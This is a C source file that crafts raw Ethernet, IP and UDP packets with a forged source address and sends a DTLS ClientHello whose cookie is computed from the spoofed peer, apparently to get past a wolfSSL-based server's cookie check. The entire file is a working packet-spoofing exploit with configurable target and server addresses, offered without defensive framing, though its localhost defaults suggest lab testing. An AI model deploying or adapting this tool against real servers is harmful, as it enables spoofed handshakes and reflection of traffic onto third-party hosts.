#include <arpa/inet.h>
#include <errno.h>
#include <getopt.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <bsd/string.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/wolfcrypt/sha.h>
#include <wolfssl/wolfcrypt/hash.h>

#define DEFAULT_IF  "eth0"
#define BUF_SIZ   1024

#define TARGET_PORT 11112
#define TARGET_ADDR "127.0.0.1"

#define SERVER_PORT 11111
#define SERVER_ADDR "127.0.0.1"

unsigned short csum(unsigned short* buf, unsigned int nwords)
{
  unsigned long sum = 0;
  for (; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void generate_cookie(char* buf, int sz, struct sockaddr* peer, socklen_t peerlen)
{
  byte digest[SHA_DIGEST_SIZE] = { 0 };
  wc_ShaHash((byte*)&peer, peerlen, digest);
  if (sz > SHA_DIGEST_SIZE)
    sz = SHA_DIGEST_SIZE;
  memcpy(buf, digest, sz);
}

int main(int argc, char** argv)
{
  char interface_name[64] = DEFAULT_IF;
  char target_addr[64] = TARGET_ADDR;
  char server_addr[64] = SERVER_ADDR;
  unsigned short target_port = TARGET_PORT;
  unsigned short server_port = SERVER_PORT;

  while (true) {
    const static struct option long_options[] = {
      {"interface", required_argument, 0, 'i'},
      {"target-ip", required_argument, 0, 't'},
      {"target-port", required_argument, 0, 'p'},
      {"server-ip", required_argument, 0, 'S'},
      {"server-port", required_argument, 0, 'P'},
      {"help", no_argument, 0, 'h'},
      {0, 0, 0, 0}
    };

    int option_index = 0;
    const int flag = getopt_long(argc, argv, "hi:t:p:S:P:", long_options, &option_index);
    if (flag == -1)
      break;

    switch (flag) {
      case 'i':
        strlcpy(interface_name, optarg, sizeof(interface_name));
        break;

      case 't':
        strlcpy(target_addr, optarg, sizeof(target_addr));
        break;

      case 'S':
        strlcpy(server_addr, optarg, sizeof(server_addr));
        break;

      case 'p':
        target_port = atoi(optarg);
        break;

      case 'P':
        server_port = atoi(optarg);
        break;

      case 'h':
        printf("%s\n", argv[0]);
        return 0;
    }
  }

  printf("interface: %s\n", interface_name);
  printf("target: %s:%d\n", target_addr, target_port);
  printf("server: %s:%d\n", server_addr, server_port);

  struct sockaddr_ll socket_address;
  memset(&socket_address, 0, sizeof(socket_address));
  socket_address.sll_halen = ETHER_ADDR_LEN;

  // raw socket
  int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
  if (sockfd == -1) {
    perror("socket");
    return 1;
  }

  // index of the interface to send on
  {
    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(struct ifreq));
    strlcpy(if_idx.ifr_name, interface_name, sizeof(if_idx.ifr_name));
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
      perror("ioctl(SIOCGIFINDEX): %s");
      close(sockfd);
      return 1;
    }
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
  }

  /* Get the MAC address of the interface to send on */
  struct ifreq if_mac;
  memset(&if_mac, 0, sizeof(struct ifreq));
  strlcpy(if_mac.ifr_name, interface_name, sizeof(if_mac.ifr_name));
  if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
    perror("ioctl(SIOCGIFHWADDR)");
    close(sockfd);
    return 1;
  }

  char sendbuf[BUF_SIZ] = { 0 };
  unsigned int tx_len = 0;

  /* Ethernet header */
  struct ether_header* eh = (struct ether_header *) sendbuf;
  memcpy(eh->ether_shost, if_mac.ifr_hwaddr.sa_data, 6);

  // get server MAC
  {
    // int sock = socket(AF_INET, SOCK_DGRAM, 0);

    struct arpreq arpreq;
    memset(&arpreq, 0, sizeof(arpreq));
    strlcpy(arpreq.arp_dev, interface_name, sizeof(arpreq.arp_dev));

    struct sockaddr_in* in = (struct sockaddr_in*) &arpreq.arp_pa;
    in->sin_family = AF_INET;
    in->sin_addr.s_addr = inet_addr(server_addr);

    const int ret = ioctl(sockfd, SIOCGARP, &arpreq);
    // close(sock);

    if (ret < 0 && errno != ENXIO) {
      perror("ioctl(SIOCGARP)");
      close(sockfd);
      return 1;
    } else if (ret >= 0) {
      // copy MAC
      memcpy(eh->ether_dhost, arpreq.arp_ha.sa_data, 6);
      memcpy(socket_address.sll_addr, arpreq.arp_ha.sa_data, 6);
    } else {
      memcpy(eh->ether_dhost, if_mac.ifr_hwaddr.sa_data, 6);
      memcpy(socket_address.sll_addr, if_mac.ifr_hwaddr.sa_data, 6);
    }
  }
  /* Ethertype field */
  eh->ether_type = htons(ETH_P_IP);
  tx_len += sizeof(struct ether_header);

  /* IP Header */
  struct iphdr* iph = (struct iphdr*)(sendbuf + tx_len);
  iph->version = 4;
  iph->ihl = 5;
  iph->tos = 16; // Low delay
  iph->id = htons(54321);
  iph->ttl = IPDEFTTL;
  iph->protocol = SOL_UDP;
  iph->saddr = inet_addr(target_addr);
  iph->daddr = inet_addr(server_addr);
  tx_len += sizeof(struct iphdr);

  struct udphdr* udph = (struct udphdr*)(sendbuf + tx_len);
  udph->source = htons(target_port);
  udph->dest = htons(server_port);
  udph->check = 0; // skip
  tx_len += sizeof(struct udphdr);

  // content type: handshake
  sendbuf[tx_len++] = 0x16;
  // version: DTLS 1.0
  sendbuf[tx_len++] = 0xfe;
  sendbuf[tx_len++] = 0xff;
  // epoch: 0
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  // sequence number: 0
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  // length: 2 bytes
  unsigned int record_layer_length = tx_len;
  tx_len += 2;
  unsigned int record_layer_start = tx_len;
  // handhake protocol: client hello
  // type: ClientHello (1)
  sendbuf[tx_len++] = 0x01;
  // length: 3 bytes
  unsigned int handshake_length = tx_len;
  tx_len += 3;
  // message sequence: 0
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  // frame offset: 0
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x00;
  // frame length: 3 bytes
  unsigned int handshake_fragment_length = tx_len;
  tx_len += 3;
  unsigned int fragment_start = tx_len;
  // version: DTLS 1.2
  sendbuf[tx_len++] = 0xfe;
  sendbuf[tx_len++] = 0xfd;
  // random
  for (unsigned int i = 0; i != 32; ++i)
    sendbuf[tx_len++] = 0xf1;
  // session ID length: 0
  sendbuf[tx_len++] = 0x00;
  // cookie length: 16
  sendbuf[tx_len++] = 0x10;
  // cookie
  struct sockaddr_in peer;
  memset(&peer, 0, sizeof(peer));
  peer.sin_family = AF_INET;
  peer.sin_port = htons(target_port);
  peer.sin_addr.s_addr = inet_addr(target_addr);
  generate_cookie(sendbuf + tx_len, 16, (struct sockaddr*) &peer, sizeof(peer));
  tx_len += 16;
  // cipher suite length
  sendbuf[tx_len++] = 0x00;
  sendbuf[tx_len++] = 0x02;
  // cipher suite
  sendbuf[tx_len++] = 0xc0;
  sendbuf[tx_len++] = 0x2b;
  // compression method length: 1
  sendbuf[tx_len++] = 0x01;
  // compression method: 0
  sendbuf[tx_len++] = 0x00;
  // extensions length: 0
  sendbuf[tx_len++] = 0x00;

  // file in lengths
  const unsigned int record_layer_size = tx_len - record_layer_start;
  sendbuf[record_layer_length + 0] = (record_layer_size & 0xff00) >> 8;
  sendbuf[record_layer_length + 1] = (record_layer_size & 0x00ff);

  const unsigned int fragment_size = tx_len - fragment_start;
  sendbuf[handshake_fragment_length + 0] = (fragment_size & 0xff0000) >> 16;
  sendbuf[handshake_fragment_length + 1] = (fragment_size & 0x00ff00) >> 8;
  sendbuf[handshake_fragment_length + 2] = (fragment_size & 0x0000ff);
  memcpy(sendbuf + handshake_length, sendbuf + handshake_fragment_length, 3);

  /* Length of UDP payload and header */
  udph->len = htons(tx_len - sizeof(struct ether_header) - sizeof(struct iphdr));
  /* Length of IP payload and header */
  iph->tot_len = htons(tx_len - sizeof(struct ether_header));
  /* Calculate IP checksum on completed header */
  iph->check = csum((unsigned short *)iph, sizeof(struct iphdr)/2);

  /* Send packet */
  if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
    printf("Send failed\n");

  close(sockfd);
  return 0;
}
